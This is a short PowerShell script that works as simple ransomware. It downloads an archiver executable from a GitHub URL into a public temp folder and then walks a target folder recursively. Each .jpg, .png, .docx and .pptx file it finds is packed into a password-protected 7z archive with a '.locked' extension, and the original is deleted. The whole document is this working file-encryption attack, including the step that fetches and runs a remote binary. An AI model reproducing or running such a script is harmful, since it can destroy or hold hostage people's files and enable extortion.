  #Target Folder Path
  $Target = "D:\Test"
 
  #Password for encrypting files
  $password = "PasswordYouWant"

  #Encryption Binary file
  $Zipper_url = "https://github.com/codesiddhant/codeworld/blob/master/zi.exe"
  $Zipper = "C:\Users\Public\Temp\Zipper"
  set-alias Zipper "$Zipper\zi.exe"


#Creating Required Folders
 New-Item -ItemType "directory" -Path $Zipper 

#Downloading Zipper File From the Internet
 Invoke-WebRequest -Uri $Zipper_url -OutFile $Zipper\zi.exe; 


 
#Select the Extesnion of targeted files
$files = Get-ChildItem $target -Recurse -File | 
Where-Object { $_.Extension -in ".jpg", ".png",".docx", ".pptx"}


#start encryption
$passwordf = '-p' + $password

foreach ($file in $files)
{
    $name = $file.name
    $directory = $file.DirectoryName
    zipper a -t7z -m0=LZMA2:d64k:fb32 -ms=8m -mmt=30 -mx=1 -mx9 $passwordf "$directory\$file.locked" "$directory\$name" -sdel | Out-Null
  
}
